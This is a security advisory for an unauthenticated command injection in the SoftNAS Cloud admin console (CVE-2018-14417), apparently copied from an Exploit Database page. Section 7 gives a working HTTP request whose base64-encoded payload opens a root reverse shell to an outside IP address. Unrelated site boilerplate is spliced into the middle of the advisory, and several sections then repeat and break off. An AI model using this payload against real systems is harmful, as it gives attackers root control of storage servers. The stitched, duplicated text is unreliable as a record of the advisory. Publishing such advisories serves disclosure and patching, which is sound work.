SoftNAS Cloud OS Command Injection

1. *Advisory Information*

Title: SoftNAS Cloud OS Command Injection
Advisory ID: CORE-2018-0009
Advisory URL:
http://www.coresecurity.com/advisories/softnas-cloud-OS-command-injection
Date published: 2018-07-26
Date of last update: 2018-05-28
Vendors contacted: SoftNAS
Release mode: Coordinated release

2. *Vulnerability Information*

Class:  Improper Neutralization of Special Elements used in an OS
Command [CWE-78]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: Yes
CVE Name: CVE-2018-14417

3. *Vulnerability Description*

SoftNAS' website states that:

[1] SoftNAS Cloud is a software-defined NAS filer delivered as a virtual
storage appliance that runs within public, private or hybrid clouds.
SoftNAS Cloud provides enterprise-grade NAS capabilities, including
encryption, snapshots, rapid rollbacks, and cross-zone high-availability
with automatic failover.

A command injection vulnerability was found in the web administration
console. In particular, snserv script did not sanitize some input
parameters before executing a system command.

4. *Vulnerable Packages*

. SoftNAS Cloud versions prior to 4.0.3
Other products and versions might be affected, but they were not tested.

5. *Vendor Information, Solutions and Workarounds*

SoftNAS released SoftNAS Cloud 4.0.3 that addresses the reported
vulnerability. The software update can be performed via the
StorageCenter admin UI in the product.
For more information on the updating process see:
https://www.softnas.com/docs/softnas/v3/html/updating_to_the_latest_version.html.

In addition, SoftNAS published the following release note:
https://docs.softnas.com/display/SD/Release+Notes

6. *Credits*

The vulnerability was discovered and researched by Fernando Diaz and
Fernando Catoira from Core Security Consulting Services. The publication
of this advisory was coordinated by Leandro Cuozzo from Core Advisories
Team.

7. *Technical Description / Proof of Concept Code*

7.1. *Check and execute update functionality abuse leading to command
execution*
[CVE-2018-14417]
The 'recentVersion' parameter from the snserv endpoint is vulnerable to
OS Command Injection when check and execute update operations are
performed.
This endpoint has no authentication/session verification. Therefore, it
is possible for an unauthenticated attacker to execute malicious code in
the target server. As the WebServer runs a Sudoer user (apache), the
malicious code can be executed with root permissions.

The following part of the /etc/sudoers file shows the apache user
capabilities.

/-----
User_Alias      APACHE = apache
# Once SoftNAS UI is operational, only allow the specific command that
require sudo access!!
Cmnd_Alias      SOFTNAS = ALL
APACHE  ALL = (ALL) NOPASSWD: SOFTNAS
-----/

The following proof of concept generates a remote shell on the target
system as root:

/-----
GET
/softnas/snserver/snserv.php?opcode=checkupdate&opcode=executeupdate&selectedupdate=3.6aaaaaaa.1aaaaaaaaaaaaaa&update_type=standard&recentVersions=3.6aaaaaaaaaaa.1aaaaaaa;echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4yLjQ1LjE4NS8xMjM0NSAwPiYx+|+base64+-d+|+sudo+bash;
HTTP/1.1
Host: 10.2.45.208
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0)
Gecko/20100101 Firefox/59.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.2.45.208/softnas/applets/update/
X-Requested-With: XMLHttpRequest
Connection: close
-----/

As can be seen in the former request the payload had to be base64
encoded as some special characters were not being properly decoded.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

For more information on the updating process see:
<https://www.softnas.com/docs/softnas/v3/html/updating_to_the_latest_version.html>.

In addition, SoftNAS published the following release note:
[https://docs.softnas.com/display/SD/Release+Notes](https://docs.softnas.com/display/SD/Release%2BNotes)

6. *Credits*

The vulnerability was discovered and researched by Fernando Diaz and
Fernando Catoira from Core Security Consulting Services. The publication
of this advisory was coordinated by Leandro Cuozzo from Core Advisories
Team.

7. *Technical Description / Proof of Concept Code*

7.1. *Check and execute update functionality abuse leading to command
execution*
[CVE-2018-14417]
The 'recentVersion' parameter from the snserv endpoint is vulnerable to
OS Command Injection when check and execute update operations are
performed.
This endpoint has no authentication/session verification. Therefore, it
is possible for an unauthenticated attacker to execute malicious code in
the target server. As the WebServer runs a Sudoer user (apache), the
malicious code can be executed with root permissions.

The following part of the /etc/sudoers file shows the apache user
capabilities.

/-----
User_Alias      APACHE = apache
# Once SoftNAS UI is operational, only allow the specific command that
require sudo access!!
Cmnd_Alias      SOFTNAS = ALL
APACHE  ALL = (ALL) NOPASSWD: SOFTNAS
-----/

The following proof of concept generates a remote shell on the target
system as root:
